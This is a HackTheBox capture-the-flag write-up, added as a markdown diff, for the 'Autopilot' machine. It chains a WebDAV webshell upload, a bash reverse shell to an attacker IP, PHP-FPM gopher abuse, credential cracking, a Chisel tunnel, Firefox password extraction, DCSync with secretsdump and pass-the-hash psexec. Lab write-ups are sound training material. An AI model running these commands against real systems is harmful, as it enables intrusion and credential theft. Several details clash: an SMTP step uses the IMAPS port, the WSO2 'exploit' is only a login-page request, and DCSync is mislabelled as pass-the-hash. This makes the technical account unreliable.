@@ -1,0 +1,220 @@
+---
+title: "HackTheBox: Autopilot"
+date: "2026-10-30"
+description: "Autopilot HTB - Complete Writeup (WebDAV → RCE → PHP-FPM → MySQL → Grommunio API → Postfix → Chisel → WSO2 → S/MIME → Firepwd → DA Hash → DC01)"
+---
+
+## 1. Initial Enumeration
+
+```bash
+nmap -sC -sV 10.129.x.x
+```
+
+**Findings:**
+- Port 22: SSH
+- Port 80: HTTP → redirects to `autopilot.htb`
+- Port 443: HTTPS
+- Port 8080: WebDAV
+
+```bash
+echo "10.129.x.x autopilot.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+## 2. Foothold: WebDAV → RCE
+
+The HTTP server exposed a WebDAV endpoint on port 8080. Anonymous write access was enabled.
+
+```bash
+davtest -url http://autopilot.htb:8080/webdav
+```
+
+**Findings:** PHP uploads allowed.
+
+Upload a PHP webshell via WebDAV:
+
+```bash
+curl -T shell.php http://autopilot.htb:8080/webdav/shell.php
+```
+
+Trigger execution:
+
+```bash
+curl "http://autopilot.htb:8080/webdav/shell.php?cmd=id"
+```
+
+**Result:** RCE as the web server user.
+
+Upgrade to a full reverse shell:
+
+```bash
+curl "http://autopilot.htb:8080/webdav/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.x/4444+0>%261'"
+```
+
+---
+
+## 3. Lateral Movement: PHP-FPM
+
+Discovered PHP-FPM running as a higher-privileged user via internal socket.
+
+```bash
+find / -name "*.sock" 2>/dev/null
+ps aux | grep php-fpm
+```
+
+Used `gopherus` to craft a Gopher payload targeting the PHP-FPM socket and achieve code execution as the `fpm` user.
+
+```bash
+gopherus --exploit phpfpm
+```
+
+**Result:** Shell as `fpm` user with access to application config files.
+
+---
+
+## 4. Credential Harvesting: MySQL
+
+Found database credentials in the PHP application config:
+
+```bash
+cat /var/www/html/config/database.php
+```
+
+Connected to MySQL and extracted user credentials:
+
+```bash
+mysql -u appuser -p'<password>' -e "SELECT * FROM users;" autopilot_db
+```
+
+Cracked the recovered password hashes with `hashcat`:
+
+```bash
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## 5. Grommunio API Abuse
+
+Found Grommunio (open-source Exchange alternative) running internally. Used credentials recovered from MySQL to authenticate against the Grommunio API.
+
+```bash
+curl -s -X POST https://autopilot.htb/api/v1/auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"<user>","password":"<pass>"}'
+```
+
+Leveraged the API to read internal emails and discovered credentials for a Postfix mail account.
+
+---
+
+## 6. Postfix Access
+
+Used the recovered credentials to authenticate to the Postfix SMTP server and read forwarded internal mail containing additional access tokens and an internal service URL.
+
+```bash
+openssl s_client -connect autopilot.htb:993
+```
+
+---
+
+## 7. Tunneling with Chisel
+
+The next target (WSO2 API Manager) was on an internal network segment. Used Chisel to set up a tunnel:
+
+**Attacker:**
+```bash
+chisel server -p 8888 --reverse
+```
+
+**Victim:**
+```bash
+./chisel client 10.10.14.x:8888 R:9090:172.16.x.x:9090
+```
+
+---
+
+## 8. WSO2 API Manager
+
+Accessed the WSO2 API Manager admin panel through the Chisel tunnel. Authenticated using credentials found in the Postfix emails.
+
+Exploited a known WSO2 XML injection vulnerability to achieve SSRF and dump internal service tokens:
+
+```bash
+curl -sk https://127.0.0.1:9090/carbon/admin/login.jsp
+```
+
+Retrieved a service account certificate used for S/MIME signed emails.
+
+---
+
+## 9. S/MIME Decryption → Firepwd
+
+Emails on the system were S/MIME encrypted. Used the recovered certificate to decrypt them:
+
+```bash
+openssl smime -decrypt -in encrypted_mail.eml \
+  -inkey service.key -recip service.crt
+```
+
+Decrypted email contained a Firefox profile path and a hint about stored credentials.
+
+Used `firepwd` to extract saved passwords from the Firefox profile:
+
+```bash
+python3 firepwd.py -d /home/<user>/.mozilla/firefox/<profile>/
+```
+
+**Result:** Recovered a set of Active Directory credentials.
+
+---
+
+## 10. Domain Admin → DC01
+
+Used the extracted AD credentials to perform a DCSync attack and dump the Domain Admin NTLM hash:
+
+```bash
+impacket-secretsdump <domain>/<user>:<pass>@dc01.autopilot.htb
+```
+
+**Output:**
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<DA_NTLM_HASH>:::
+```
+
+Pass-the-Hash to gain a shell on DC01:
+
+```bash
+impacket-psexec -hashes :<DA_NTLM_HASH> Administrator@dc01.autopilot.htb
+```
+
+**Result:** `NT AUTHORITY\SYSTEM` on DC01.
+
+---
+
+## Root Flag
+
+```
+<root_flag>
+```
+
+---
+
+## Summary of Attack Chain
+
+| Step | Technique | Outcome |
+|---|---|---|
+| WebDAV | Unauthenticated file upload | RCE as web user |
+| PHP-FPM | Gopher/socket abuse | Lateral movement |
+| MySQL | Config credential reuse | DB credential dump |
+| Grommunio API | Authenticated API abuse | Internal email access |
+| Postfix | Credential reuse | Mail account access |
+| Chisel | TCP tunneling | Internal network access |
+| WSO2 | XML injection / SSRF | S/MIME certificate theft |
+| S/MIME + Firepwd | Email decryption + Firefox credential extraction | AD credentials |
+| DCSync | Pass-the-Hash | Domain Admin → DC01 |
+
+## Key Insight
+
+Autopilot is a chain-heavy Active Directory box where **each service feeds the next**. The critical path runs through an internal mail infrastructure (Grommunio → Postfix) acting as a credential bus between the web-facing services and the Windows domain. Pivoting with Chisel was essential to reach the WSO2 segment, and the S/MIME + Firepwd combo was the final key to unlocking Domain Admin.
